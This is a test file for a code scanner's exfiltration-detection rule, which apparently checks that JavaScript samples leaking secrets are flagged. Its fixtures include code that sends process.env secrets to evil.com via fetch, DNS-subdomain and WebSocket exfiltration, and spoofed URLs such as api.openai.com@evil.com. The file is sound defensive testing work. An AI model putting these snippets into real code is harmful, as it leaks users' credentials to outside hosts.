import { describe, expect, test } from "bun:test";
import { parseSync } from "oxc-parser";
import type { ScanContext, ScannerConfig } from "../types.js";
import { exfiltrationRule } from "./exfiltration.js";

function scanCode(code: string, config?: ScannerConfig): ReturnType<typeof exfiltrationRule.check> {
  const result = parseSync("input.ts", code, { sourceType: "module" });
  const ctx: ScanContext = {
    program: result.program,
    sourceText: code,
    filename: "input.ts",
    ...(config !== undefined ? { config } : {}),
  };
  return exfiltrationRule.check(ctx);
}

describe("exfiltration rule", () => {
  describe("malicious patterns", () => {
    test("detects fetch + process.env combination", () => {
      const findings = scanCode(
        'const secret = process.env.SECRET;\nfetch("https://evil.com?d=" + secret);',
      );
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(true);
      expect(findings.some((f) => f.severity === "HIGH")).toBe(true);
    });

    test("detects dns.lookup with dynamic argument", () => {
      const findings = scanCode(
        'const data = "secret";\ndns.lookup(data + ".evil.com", () => {});',
      );
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.some((f) => f.rule === "exfiltration:dns-exfil")).toBe(true);
    });

    test("detects new WebSocket + env access", () => {
      const findings = scanCode(
        'const key = process.env.API_KEY;\nnew WebSocket("ws://evil.com");',
      );
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(true);
    });

    test("detects btoa + fetch combination", () => {
      const findings = scanCode(
        'const encoded = btoa("data");\nfetch("https://example.com/" + encoded);',
      );
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.some((f) => f.rule === "exfiltration:encoding-network")).toBe(true);
    });

    test("detects Bun.env access with network call", () => {
      const findings = scanCode('const key = Bun.env.SECRET;\nfetch("https://evil.com");');
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(true);
    });
  });

  describe("benign patterns", () => {
    test("fetch alone produces no HIGH findings", () => {
      const findings = scanCode('fetch("https://api.example.com/data");');
      expect(
        findings.filter((f) => f.severity === "HIGH" || f.severity === "CRITICAL"),
      ).toHaveLength(0);
    });

    test("process.env alone produces only LOW finding", () => {
      const findings = scanCode("const port = process.env.PORT;");
      expect(findings.length).toBeGreaterThan(0);
      expect(findings.every((f) => f.severity === "LOW")).toBe(true);
    });

    test("math operations produce no findings", () => {
      const findings = scanCode("const x = Math.max(1, 2);");
      expect(findings).toHaveLength(0);
    });
  });

  describe("domain allowlisting", () => {
    test("trusted domain fetch + process.env does NOT trigger network-env", () => {
      const findings = scanCode(
        'const key = process.env.OPENAI_KEY;\nfetch("https://api.openai.com/v1/chat", { headers: { Authorization: key } });',
      );
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(false);
      // Should still have env-access LOW finding since no untrusted network call
      expect(findings.some((f) => f.rule === "exfiltration:env-access")).toBe(true);
    });

    test("trusted domain fetch + btoa does NOT trigger encoding-network", () => {
      const findings = scanCode(
        'const encoded = btoa("data");\nfetch("https://api.anthropic.com/v1/messages");',
      );
      expect(findings.some((f) => f.rule === "exfiltration:encoding-network")).toBe(false);
    });

    test("untrusted domain fetch + process.env DOES trigger network-env", () => {
      const findings = scanCode(
        'const secret = process.env.SECRET;\nfetch("https://evil.com/steal?d=" + secret);',
      );
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(true);
    });

    test("dynamic URL fetch + process.env DOES trigger network-env", () => {
      const findings = scanCode("const url = getUrl();\nconst key = process.env.KEY;\nfetch(url);");
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(true);
    });

    test("mixed trusted and untrusted calls + env still triggers", () => {
      const findings = scanCode(
        'const key = process.env.KEY;\nfetch("https://api.openai.com/v1/chat");\nfetch("https://evil.com/exfil");',
      );
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(true);
    });

    test("does NOT trust subdomain-spoofed URL (api.openai.com.evil.com)", () => {
      const findings = scanCode(
        'const key = process.env.KEY;\nfetch("https://api.openai.com.evil.com/exfil");',
      );
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(true);
    });

    test("does NOT trust userinfo-spoofed URL (api.openai.com@evil.com)", () => {
      const findings = scanCode(
        'const key = process.env.KEY;\nfetch("https://api.openai.com@evil.com/exfil");',
      );
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(true);
    });

    test("trusts domain with path separator after domain", () => {
      const findings = scanCode(
        'const key = process.env.KEY;\nfetch("https://api.github.com/repos");',
      );
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(false);
    });

    test("trusts domain with port after domain", () => {
      const findings = scanCode(
        'const key = process.env.KEY;\nfetch("https://api.stripe.com:443/v1/charges");',
      );
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(false);
    });
  });

  describe("configurable trusted domains", () => {
    test("user-configured domain suppresses network-env finding", () => {
      const findings = scanCode(
        'const key = process.env.KEY;\nfetch("https://internal.corp.io/api");',
        { trustedDomains: ["internal.corp.io"] },
      );
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(false);
      expect(findings.some((f) => f.rule === "exfiltration:env-access")).toBe(true);
    });

    test("default domains still work with custom domains added", () => {
      const findings = scanCode(
        'const key = process.env.KEY;\nfetch("https://api.openai.com/v1/chat");',
        { trustedDomains: ["internal.corp.io"] },
      );
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(false);
    });

    test("untrusted domain still fires with custom domains configured", () => {
      const findings = scanCode('const key = process.env.KEY;\nfetch("https://evil.com/steal");', {
        trustedDomains: ["internal.corp.io"],
      });
      expect(findings.some((f) => f.rule === "exfiltration:network-env")).toBe(true);
    });
  });

  describe("edge cases", () => {
    test("handles empty code", () => {
      const findings = scanCode("");
      expect(findings).toHaveLength(0);
    });
  });
});
